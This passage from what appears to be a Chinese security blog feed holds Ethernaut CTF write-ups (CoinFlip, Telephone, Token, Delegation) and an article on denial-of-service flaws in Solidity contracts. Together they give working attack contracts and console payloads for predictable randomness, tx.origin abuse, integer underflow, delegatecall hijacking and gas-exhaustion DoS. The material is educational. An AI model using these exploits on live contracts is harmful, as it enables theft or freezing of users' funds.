&#39;..&#x2F;SafeMath.sol&#39;;</span><br><span class="line"></span><br><span class="line">contract CoinFlip &#123;</span><br><span class="line"></span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  uint256 public consecutiveWins;</span><br><span class="line">  uint256 lastHash;</span><br><span class="line">  uint256 FACTOR &#x3D; 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"></span><br><span class="line">  constructor() public &#123;</span><br><span class="line">    consecutiveWins &#x3D; 0;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function flip(bool _guess) public returns (bool) &#123;</span><br><span class="line">    uint256 blockValue &#x3D; uint256(blockhash(block.number.sub(1)));</span><br><span class="line"></span><br><span class="line">    if (lastHash &#x3D;&#x3D; blockValue) &#123;</span><br><span class="line">      revert();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    lastHash &#x3D; blockValue;</span><br><span class="line">    uint256 coinFlip &#x3D; blockValue.div(FACTOR);</span><br><span class="line">    bool side &#x3D; coinFlip &#x3D;&#x3D; 1 ? true : false;</span><br><span class="line"></span><br><span class="line">    if (side &#x3D;&#x3D; _guess) &#123;</span><br><span class="line">      consecutiveWins++;</span><br><span class="line">      return true;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      consecutiveWins &#x3D; 0;</span><br><span class="line">      return false;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>这个合约是一个“掷硬币猜正反”的游戏，要求连续猜对10次极为通关。<br/><br>先来分析一下合约：<br><code>block.number</code>可以用来获取当前交易对应block的编号，而这里减1获取的就是前一个block的编号，而<code>blockhash(id)</code>可以获取对应id的block的hash值，然后uint256将其转换为16进制对应的数值。其中给的factor就是<code>2^{256}/2</code>，所以每次做完除法的结果有一半几率是0，一半是1。<br>这里补充一下几个知识：</p><ul><li><p>补充</p><ul><li><strong>Solidity block对象</strong><br>block.coinbase (address): 当前块的矿工的地址<br>block.difficulty (uint):当前块的难度系数<br>block.gaslimit (uint):当前块gas的上限<br>block.number (uint):当前块编号<br>block.blockhash (function(uint) returns (bytes32)):函数，返回指定块的哈希值，已经被内建函数blockhash所代替<br>block.timestamp (uint):当前块的时间戳</li></ul><p><br/></p><ul><li><p><strong>Revert</strong><br>revert是solidity中的一种错误处理机制，<br>而revert一旦触发，会导致当前调用中的所有更改都被还原并将错误数据传递回调用者。<br>revert由两种使用形式：</p><ul><li>revert ：<code>revert CustomError（arg1， arg2）;</code>该语句将自定义错误作为不带括号的直接参数</li><li>revert() ：<code>revert（）;revert（“description”）;</code>出于向后兼容的原因，还有一个函数，它使用括号并接受字符串</li></ul><p><br/></p></li><li><p><strong>Revert与Require与Assert</strong></p><ul><li>Assert： 可以理解为严厉一点的判断，如果判断失败，将会burn掉你的gas</li><li>Require: 可以理解为温和一点的判断，就算判断失败，gas会返回给调用者</li><li>Revert ：revert的用法和throw很像，也会撤回所有的状态转变。但是它有两点不同：<ol><li>它允许你返回一个值</li><li>它会把所有剩下的gas退回给caller</li></ol></li></ul></li></ul><p>详情参见<a href="https://docs.soliditylang.org/en/latest/control-structures.html#revert-statement" target="_blank" rel="noopener">solidity参考文档</a><br><br/></p></li><li><p>漏洞分析：<br>本题的漏洞就出在通过<code>block.blockhash(block.number - 1)</code>获取负一高度的区块哈希来生成随机数的方式是极易被攻击利用的。</p><blockquote><p>原理是在区块链中，一个区块包含多个交易，我们可以先运行一下上述除法计算的过程获取结果究竟是0还是1，然后再发送对应的结果过去，区块链中块和快之前的间隔大概有10秒，手动去做会有问题，而且不能保证我们计算的合约是否和题目运算调用在同一个block上，因此需要写一个攻击合约完成调用。我们在攻击合约中调用题目中的合约，可以保证两个交易一定被打包在同一个区块上，因此它们获取的<code>block.number.sub(1)</code>是一样的。</p></blockquote><p>其实就是利用了一个区块中可能由多个交易，而我们可以自己创建一个交易，执行与题目中一样的语句后得到的<code>block.number.sub(1)</code>是一样的<br><br/></p><p>攻击合约代码如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &#39;..&#x2F;SafeMath.sol&#39;;</span><br><span class="line">import &#39;.&#x2F;CoinFlip.sol&#39;;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line"></span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  uint256 public consecutiveWins;</span><br><span class="line">  uint256 lastHash;</span><br><span class="line">  uint256 FACTOR &#x3D; 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line">  address adr &#x3D; 0xFd288CbD59B3f74A70B10730a076Ad0b59479C56;&#x2F;&#x2F;被攻击合约地址</span><br><span class="line">  CoinFlip coin &#x3D; CoinFlip(adr);</span><br><span class="line"></span><br><span class="line">  function dosome() public returns (bool) &#123;</span><br><span class="line">    uint256 blockValue &#x3D; uint256(blockhash(block.number.sub(1)));</span><br><span class="line"></span><br><span class="line">    if (lastHash &#x3D;&#x3D; blockValue) &#123;</span><br><span class="line">      revert();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    lastHash &#x3D; blockValue;</span><br><span class="line">    uint256 coinFlip &#x3D; blockValue.div(FACTOR);</span><br><span class="line">    bool side &#x3D; coinFlip &#x3D;&#x3D; 1 ? true : false;</span><br><span class="line">    coin.flip(side);</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>部署成功后只需要执行10次<code>dosome</code>方法即可</p><blockquote><p>我试过编写一个函数用一个for循环来控制<code>dosome()</code>执行的次数，最终以失败告终，应该是由于循环多了之后造成gas超过了gaslimit的上限。<br>解题步骤：</p></blockquote></li></ul><ol><li>将我们的攻击合约部署在测试链上</li><li>执行10次<code>dosome()</code>函数</li><li>通关<br><img src="11.png" alt=""></li></ol><h2 id="04-Telephone"><a href="#04-Telephone" class="headerlink" title="04 Telephone"></a>04 Telephone</h2><p>此题考查<code>tx.origin</code>和<code>msg.sender</code>的区别。没有什么难点<br>先看代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Telephone &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  constructor() public &#123;</span><br><span class="line">    owner &#x3D; msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function changeOwner(address _owner) public &#123;</span><br><span class="line">    if (tx.origin !&#x3D; msg.sender) &#123;</span><br><span class="line">      owner &#x3D; _owner;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>题目要求获得合约所有权，可以看到只要满足<code>tx.origin != msg.sender</code>就行。在此介绍一下<code>tx.origin</code>：</p><blockquote><p>tx.origin是Solidity的一个全局变量，它遍历整个调用栈并返回最初发送调用（或事务）的帐户的地址。</p></blockquote><p><strong>在智能合约中使用此变量进行身份验证会使合约容易受到类似网络钓鱼的攻击。</strong><br/><br>因为tx.origin是交易的原始发起者，而我们可以通过很多方式使得tx.origin作为智能合约的授权变得不可靠。</p><blockquote><p>举个例子：假设A、B、C都是已经部署的合约，如果我们用A去调用C，即A-&gt;C，那么在C合约看来，A既是tx.origin，又是msg.sender。如果调用链是A-&gt;B-&gt;C，那么对于合约C来说，A是tx.origin，B是msg.sender，即msg.sender是直接调用的一方，而tx.origin是交易的原始发起者</p></blockquote><ul><li><p>漏洞分析<br>在此题中，我们只需要写一个攻击合约，使攻击合约通过另一个地址去调用受攻击合约就行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">interface Telephone &#123;</span><br><span class="line">    function changeOwner(address _owner) external;</span><br><span class="line">&#125;</span><br><span class="line">contract Attack &#123;</span><br><span class="line">    Telephone t;</span><br><span class="line">    constructor(address _adr) public&#123;</span><br><span class="line">        t &#x3D; Telephone(_adr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function exp () public &#123;</span><br><span class="line">        t.changeOwner(0x100200fF289D4dA0634fF36d7f5D96524f7EFf67);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>总结：<br>tx.origin不应该用于智能合约的授权。更多的时候采用<code>msg.sender == owner</code>来进行判断。<br/><br>但它也有自己使用的场景，比如想要拒绝外部合约调用当前合约则可使用<code>require（tx.origin ==msg.sender）</code>来进行实现。</li></ul><h2 id="05-Token"><a href="#05-Token" class="headerlink" title="05 Token"></a>05 Token</h2><p>这是一个整数溢出的漏洞<br>先看代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Token &#123;</span><br><span class="line"></span><br><span class="line">  mapping(address &#x3D;&gt; uint) balances;</span><br><span class="line">  uint public totalSupply;</span><br><span class="line"></span><br><span class="line">  constructor(uint _initialSupply) public &#123;</span><br><span class="line">    balances[msg.sender] &#x3D; totalSupply &#x3D; _initialSupply;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function transfer(address _to, uint _value) public returns (bool) &#123;</span><br><span class="line">    require(balances[msg.sender] - _value &gt;&#x3D; 0);</span><br><span class="line">    balances[msg.sender] -&#x3D; _value;</span><br><span class="line">    balances[_to] +&#x3D; _value;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function balanceOf(address _owner) public view returns (uint balance) &#123;</span><br><span class="line">    return balances[_owner];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不难发现，这个合约没有用到<code>SafeMath</code>那么我们就要格外关注是否存在整数溢出型的漏洞。<br>不出意外：在transfer方法中<code>require(balances[msg.sender] - _value &gt;= 0)</code>使明显存在整数下溢的风险的。<br/><br>由于题目中说到我们一开始拥有20个token，那我们只需要向此合约发出交易，<code>_value&gt;20</code>即可使<code>balances[msg.sender] - _value</code> 发生下溢变成一个很大的值从而符合判定条件。</p><ul><li>解题思路</li></ul><ol><li>在控制台调用transfer方法value为21即可<br><img src="08.png" alt=""></li><li>此时查看我们的账户余额已经是一个相当大的值<br><img src="09.png" alt=""></li><li>通关</li></ol></li></ul><h2 id="06-Delegation"><a href="#06-Delegation" class="headerlink" title="06 Delegation"></a>06 Delegation</h2><p>这道题考查对delegatecall()的认识<br>非常危险<br>先看代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Delegate &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  constructor(address _owner) public &#123;</span><br><span class="line">    owner &#x3D; _owner;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function pwn() public &#123;</span><br><span class="line">    owner &#x3D; msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Delegation &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line">  Delegate delegate;</span><br><span class="line"></span><br><span class="line">  constructor(address _delegateAddress) public &#123;</span><br><span class="line">    delegate &#x3D; Delegate(_delegateAddress);</span><br><span class="line">    owner &#x3D; msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fallback() external &#123;</span><br><span class="line">    (bool result,) &#x3D; address(delegate).delegatecall(msg.data);</span><br><span class="line">    if (result) &#123;</span><br><span class="line">      this;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本题目的是要拿到合约的所有权，阅读代码后，其实就是想要通过<code>Delegation</code>合约调用<code>Delegate</code>中的<code>pwn()</code>函数，即可完成对<code>owner</code>的修改</p><ul><li>漏洞分析<br>我们注意到<code>Delegation</code>中的fallback()函数有<code>address(delegate).delegatecall(msg.data);</code>出现，而关于delegatecall的有关介绍可以参考我的另一篇博文，我们可以知道delegatecall函数是非常危险的，而且历史上已经多次被用于进行 attack vector. 使用它。<br/><br>我们在这道题当中只需要给<code>Delegation</code>合约转账，触发他的<code>fallback</code>函数并通过函数签名的方式传入<code>data</code>即可</li></ul><p>解题步骤：</p><ol><li>执行<code>contract.sendTransaction({data:web3.utils.keccak256(&quot;pwn()&quot;).slice(0,10)});</code>给当前合约赚一笔帐并指定data<br><img src="10.png" alt=""></li><li>通关</li></ol>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ethernaut </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>拒绝服务漏洞</title>
      <link href="/Denial-Service/"/>
      <url>/Denial-Service/</url>
      
        <content type="html"><![CDATA[<h1 id="合约中的拒绝服务漏洞："><a href="#合约中的拒绝服务漏洞：" class="headerlink" title="合约中的拒绝服务漏洞："></a>合约中的拒绝服务漏洞：</h1><hr><pre><code>author：Thomas_Xu</code></pre><h2 id="何为Dos"><a href="#何为Dos" class="headerlink" title="何为Dos"></a>何为Dos</h2><p>DoS 是DenialOfService，拒绝服务的缩写[3]，从字面上来理解，就是用户所需要的服务请求无法被系统处理。<br>打个比方来形容DoS，火车站是为大家提供乘车服务的，如果想要DoS火车站的话，方法有很多，可以占用过道不上车，堵住售票点不付钱，阻挠列车员或者司机不让开车，甚至用破坏铁轨等更加极端的手段来影响车站服务的正常运营。<br>过去针对互联网的DoS有很多种方法，但基本分为三大类：利用软件实现的缺陷，利用协议的漏洞，利用资源压制[3]。<br>此外还有DDoS，称为分布式DoS，其区别就是攻击者利用远程操控的计算机同时向目标发起进攻，在上面的比喻中可以理解为雇佣了几百个地痞流氓来做同样的事影响车站的运作。</p><h2 id="事件回顾"><a href="#事件回顾" class="headerlink" title="事件回顾"></a>事件回顾</h2><p>2016年2月6日至8日The King of the Ether Throne（以下简称KotET）“纷争时代”（Turbulent Age）期间，许多游戏中的退位君王的补偿和未接受款项无法退回用户玩家的钱包.<br>具有讽刺意味的是同年6月，连庞氏骗局GovernMental的合约也遭遇DoS攻击，当时1100以太币是通过使用250万gas交易获得[2]，这笔交易超出了合约能负荷的gas上限，带来交易活动的暂停。<br/><br>无论是蓄意破坏交易正常流程还是阻塞交易通道，都用到了一个互联网时代已经盛行已久的攻击方式——DoS，也就是我们所说的拒绝服务攻击。<br>这种攻击方式可以让合约执行的正常的交易操作被扰乱，中止，冻结，更严重的是让合约本身的逻辑无法运行</p><h2 id="已知漏洞的类型"><a href="#已知漏洞的类型" class="headerlink" title="已知漏洞的类型"></a>已知漏洞的类型</h2><ol><li>未设定gas费率的外部调用</li><li>依赖外部的调用进展</li><li>owner错误操作</li><li>数组或映射过长</li><li>逻辑设计错误</li><li>缺少依赖库</li></ol><h2 id="未设定gas费率的外部调用"><a href="#未设定gas费率的外部调用" class="headerlink" title="未设定gas费率的外部调用"></a>未设定gas费率的外部调用</h2><p>在合约中你可能想要通过call调用去执行某些东西的时候，因为未设定gas费率导致可能发生恶意的调用。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"> </span><br><span class="line">import &#39;@openzeppelin&#x2F;contracts&#x2F;math&#x2F;SafeMath.sol&#39;;</span><br><span class="line"> </span><br><span class="line">contract Denial &#123;</span><br><span class="line"> </span><br><span class="line">    using SafeMath for uint256;</span><br><span class="line">    address public partner; &#x2F;&#x2F; withdrawal partner - pay the gas, split the withdraw</span><br><span class="line">    address payable public constant owner &#x3D; address(0xA9E);</span><br><span class="line">    uint timeLastWithdrawn;</span><br><span class="line">    mapping(address &#x3D;&gt; uint) withdrawPartnerBalances; &#x2F;&#x2F; keep track of partners balances</span><br><span class="line"> </span><br><span class="line">    function setWithdrawPartner(address _partner) public &#123;</span><br><span class="line">        partner &#x3D; _partner;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    &#x2F;&#x2F; withdraw 1% to recipient and 1% to owner</span><br><span class="line">    function withdraw() public &#123;</span><br><span class="line">        uint amountToSend &#x3D; address(this).balance.div(100);</span><br><span class="line">        &#x2F;&#x2F; perform a call without checking return</span><br><span class="line">        &#x2F;&#x2F; The recipient can revert, the owner will still get their share</span><br><span class="line">        partner.call.value(amountToSend)(&quot;&quot;);</span><br><span class="line">        owner.transfer(amountToSend);</span><br><span class="line">        &#x2F;&#x2F; keep track of last withdrawal time</span><br><span class="line">        timeLastWithdrawn &#x3D; now;</span><br><span class="line">        withdrawPartnerBalances[partner] &#x3D; withdrawPartnerBalances[partner].add(amountToSend);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    &#x2F;&#x2F; allow deposit of funds</span><br><span class="line">    fallback() external payable &#123;&#125;</span><br><span class="line"> </span><br><span class="line">    &#x2F;&#x2F; convenience function</span><br><span class="line">    function contractBalance() public view returns (uint) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>从合约的代码中我们很容易发现这里存在一个重入漏洞，所以可以通过部署了一个利用重入漏洞的合约，把gas直接消耗光，那么owner 自然收不到钱了，从而造成DOS。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">contract Attack&#123;</span><br><span class="line">    address instance_address &#x3D; instance_address_here;</span><br><span class="line">    Denial target &#x3D; Denial(instance_address);</span><br><span class="line"> </span><br><span class="line">    function hack() public &#123;</span><br><span class="line">        target.setWithdrawPartner(address(this));</span><br><span class="line">        target.withdraw();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    function () payable public &#123;</span><br><span class="line">        target.withdraw();</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>或者assert 函数触发异常之后会消耗所有可用的 gas，消耗了所有的 gas 那就没法转账了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">contract Attack&#123;</span><br><span class="line">    address instance_address &#x3D; instance_address_here;</span><br><span class="line">    Denial target &#x3D; Denial(instance_address);</span><br><span class="line">    function hack() public &#123;</span><br><span class="line">        target.setWithdrawPartner(address(this));</span><br><span class="line">        target.withdraw();</span><br><span class="line">    &#125;</span><br><span class="line">    function () payable public &#123;</span><br><span class="line">        assert(0&#x3D;&#x3D;1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><ul><li>解决方案<blockquote><p>使用call函数时可以调试出执行操作需要的大致gas费率，在call函数指定稍大一些费率，避免攻击发生。</p><h2 id="依赖外部的调用进展"><a href="#依赖外部的调用进展" class="headerlink" title="依赖外部的调用进展"></a>依赖外部的调用进展</h2><p>这类漏洞常见于竞拍的合约当中，你的想法是如果有人出价高于现阶段的价格，就把当前的竞拍者的token退还给他，再去更新竞拍者，殊不知transfer函数执行失败后，亦会使下面的步骤无法执行。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"> </span><br><span class="line">contract King &#123;</span><br><span class="line"> </span><br><span class="line">  address payable king;</span><br><span class="line">  uint public prize;</span><br><span class="line">  address payable public owner;</span><br><span class="line"> </span><br><span class="line">  constructor() public payable &#123;</span><br><span class="line">    owner &#x3D; msg.sender;  </span><br><span class="line">    king &#x3D; msg.sender;</span><br><span class="line">    prize &#x3D; msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  fallback() external payable &#123;</span><br><span class="line">    require(msg.value &gt;&#x3D; prize || msg.sender &#x3D;&#x3D; owner);</span><br><span class="line">    king.transfer(msg.value);</span><br><span class="line">    king &#x3D; msg.sender;</span><br><span class="line">    prize &#x3D; msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  function _king() public view returns (address payable) &#123;</span><br><span class="line">    return king;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>谁发送大于 king 的金额就能成为新的 king，但是要先把之前的国王的钱退回去才能更改 king。只要我们一直不接受退回的奖金，那我们就能够一直保持 king 的身份，那就把合约的fallback函数不弄成payable就能一直不接受了。当然第一步是先成为King</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.18;</span><br><span class="line"> </span><br><span class="line">contract Attacker&#123;</span><br><span class="line">    constructor(address target) public payable&#123;</span><br><span class="line">        target.call.gas(1000000).value(msg.value)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;未定义fallback函数，就没有payable修饰</span><br></pre></td></tr></table></figure></blockquote></li><li>解决方案</li></ul><h2 id="owner错误操作"><a href="#owner错误操作" class="headerlink" title="owner错误操作"></a>owner错误操作</h2><p>本类型涉及到函数修饰关键词的使用，owner可以设定合约的当前状态，因为错误的操作使得当前合约的状态设置为不可交易，出现非主观的拒绝服务。将令牌系统理解为股市，有时需要进行休市操作。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.24;</span><br><span class="line"> </span><br><span class="line">contract error&#123;</span><br><span class="line">    address owner;</span><br><span class="line">    bool activestatus;</span><br><span class="line"> </span><br><span class="line">    modifier onlyowner&#123;</span><br><span class="line">        require(msg.sender&#x3D;&#x3D;owner);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">    modifier active&#123;</span><br><span class="line">        require(activestatus);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">    function activecontract() onlyowner&#123;</span><br><span class="line">        activestatus &#x3D; true;</span><br><span class="line">    &#125;</span><br><span class="line">    function inactivecontract() onlyowner&#123;</span><br><span class="line">        activestatus &#x3D; false;</span><br><span class="line">    &#125;</span><br><span class="line">    function transfer() active&#123;</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>如果owner调用了inactivecontract函数，使得activestatus变成false</p><p>之后所有被active修饰的函数都无法调用，无法通过require判定</p><p>令牌生态系统的整个操作取决于一个地址，这是非常危险的</p><h2 id="数组或映射过长"><a href="#数组或映射过长" class="headerlink" title="数组或映射过长"></a>数组或映射过长</h2><p>本类型的漏洞存在于利益分发合约，类似于公司给股东的分红，但是由于以太坊区块有gas费率交易上限，如果数组过大会导致操作执行的gas远远超出上限，从而导致交易失败，也就无法分红<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">contract DistributeTokens &#123;</span><br><span class="line">    address public owner; &#x2F;&#x2F; gets set somewhere</span><br><span class="line">    address[] investors; &#x2F;&#x2F; array of investors</span><br><span class="line">    uint[] investorTokens; &#x2F;&#x2F; the amount of tokens each investor gets</span><br><span class="line"> </span><br><span class="line">    &#x2F;&#x2F; ... extra functionality, including transfertoken()</span><br><span class="line"> </span><br><span class="line">    function invest() public payable &#123;</span><br><span class="line">        investors.push(msg.sender);</span><br><span class="line">        investorTokens.push(msg.value * 5); &#x2F;&#x2F; 5 times the wei sent</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">    function distribute() public &#123;</span><br><span class="line">        require(msg.sender &#x3D;&#x3D; owner); &#x2F;&#x2F; only owner</span><br><span class="line">        for(uint i &#x3D; 0; i &lt; investors.length; i++) &#123; </span><br><span class="line">            &#x2F;&#x2F; here transferToken(to,amount) transfers &quot;amount&quot; of tokens to the address &quot;to&quot;</span><br><span class="line">            transferToken(investors[i],investorTokens[i]); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span 